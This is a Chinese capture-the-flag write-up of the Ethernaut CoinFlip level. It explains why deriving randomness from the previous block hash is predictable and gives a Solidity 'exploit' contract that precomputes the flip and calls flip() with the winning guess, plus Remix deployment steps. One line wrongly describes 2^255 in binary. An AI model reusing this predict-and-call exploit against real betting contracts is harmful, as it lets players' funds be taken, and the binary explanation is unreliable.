# Ethernaut做题笔记(第四题)

## 1.题目要求

这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。

 这可能能帮助到你

- 查看上面的帮助页面，["Beyond the console"](https://ethernaut.openzeppelin.com/help) 部分



## 2.题目代码

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```



## 3.合约分析

在合约的开头先定义了三个uint256类型的数据——consecutiveWins、lastHash、FACTOR，其中FACTOR被赋予了一个很大的数值，之后查看了一下发现是2^255。

之后定义的CoinFlip为构造函数，在构造函数中将我们的猜对次数初始化为0。

之后的flip函数先定义了一个blockValue，值是前一个区块的hash值转换为uint256类型，block.number为当前的区块数，之后检查lasthash是否等于blockValue，相等则revert，回滚到调用前状态。之后便给lasthash赋值为blockValue，所以lasthash代表的就是上一个区块的hash值。

之后就是产生coinflip，它就是拿来判断硬币翻转的结果的，它是拿blockValue/FACTR，前面也提到FACTOR实际是等于2^255，若换成256的二进制就是最左位是0，右边全是1，而我们的blockValue则是256位的，因为solidity里“/”运算会取整，所以coinflip的值其实就取决于blockValue最高位的值是1还是0，换句话说就是跟它的最高位相等，下面的代码就是简单的判断了。

通过对以上代码的分析我们可以看到硬币翻转的结果其实完全取决于前一个块的hash值，看起来这似乎是随机的，它也确实是随机的，然而事实上它也是可预测的，因为一个区块当然并不只有一个交易，所以我们完全可以先运行一次这个算法，看当前块下得到的coinflip是1还是0然后选择对应的guess，这样就相当于提前看了结果。因为块之间的间隔也只有10s左右，要手工在命令行下完成合约分析中操作还是有点困难，所以我们需要在链上另外部署一个合约来完成这个操作，在部署时可以直接使用remix来部署



## 4.攻击合约

```
pragma solidity ^0.4.18;
contract CoinFlip {
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number-1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract exploit {
  CoinFlip expFlip;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function exploit(address aimAddr) {
    expFlip = CoinFlip(aimAddr);
  }

  function hack() public {
    uint256 blockValue = uint256(block.blockhash(block.number-1));
    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
    bool guess = coinFlip == 1 ? true : false;
    expFlip.flip(guess);
  }
}
```



## 5.攻击流程

先获取一个新实例，之后获取合约的地址以及"consecutiveWins"的值

![i2NCkN.png](https://i.328888.xyz/2023/04/01/i2NCkN.png)



之后在remix中编译攻击合约exploit

![i2NlBV.png](https://i.328888.xyz/2023/04/01/i2NlBV.png)



之后在remix中部署"exploit"合约，这里需要使用上面获取到的合约地址

![i2Nw9d.png](https://i.328888.xyz/2023/04/01/i2Nw9d.png)



之后合约成功部署

![i2NM0o.png](https://i.328888.xyz/2023/04/01/i2NM0o.png)



之后点击"hack"实施攻击（至少需要调用10次）

![i2NPXN.png](https://i.328888.xyz/2023/04/01/i2NPXN.png)



之后再次查看“consecutiveWins”的值，直到大于10时提交即可

![i2Nf9C.png](https://i.328888.xyz/2023/04/01/i2Nf9C.png)



之后提交该实例,完成闯关

![i2NANX.png](https://i.328888.xyz/2023/04/01/i2NANX.png)

![i2N44P.png](https://i.328888.xyz/2023/04/01/i2N44P.png)
